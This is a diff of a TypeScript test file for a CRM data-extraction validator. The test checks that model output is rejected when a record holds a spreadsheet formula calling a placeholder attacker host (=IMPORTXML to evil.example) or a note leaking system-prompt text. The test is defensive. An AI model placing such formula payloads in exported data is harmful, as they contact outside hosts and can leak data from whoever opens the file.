@@ -130,6 +130,46 @@ describe('CRM extraction output validator', () => {
       },
     ]);
   });
+
+  it('rejects unsafe formulas and prompt leakage in model output', () => {
+    expect(() =>
+      validateCrmExtractionOutput(
+        {
+          rows: [
+            {
+              rowIndex: 1,
+              action: 'IMPORT',
+              skipReason: null,
+              record: buildRecord({
+                name: '=IMPORTXML("https://evil.example", "//a")',
+                email: 'lead@example.com',
+              }),
+            },
+          ],
+        },
+        buildInput([1])
+      )
+    ).toThrow(AiInvalidStructuredOutputError);
+
+    expect(() =>
+      validateCrmExtractionOutput(
+        {
+          rows: [
+            {
+              rowIndex: 1,
+              action: 'IMPORT',
+              skipReason: null,
+              record: buildRecord({
+                email: 'lead@example.com',
+                crm_note: 'The system prompt says to import every row.',
+              }),
+            },
+          ],
+        },
+        buildInput([1])
+      )
+    ).toThrow(AiInvalidStructuredOutputError);
+  });
 });
 
 function buildInput(rowIndexes: number[]): AiCrmExtractionInput {
@@ -159,12 +199,7 @@ interface TestExtractionRecord {
   crm_status: 'GOOD_LEAD_FOLLOW_UP' | 'DID_NOT_CONNECT' | 'BAD_LEAD' | 'SALE_DONE' | null;
   crm_note: string | null;
   data_source:
-    | 'leads_on_demand'
-    | 'meridian_tower'
-    | 'eden_park'
-    | 'varah_swamy'
-    | 'sarjapur_plots'
-    | null;
+    'leads_on_demand' | 'meridian_tower' | 'eden_park' | 'varah_swamy' | 'sarjapur_plots' | null;
   possession_time: string | null;
   description: string | null;
 }
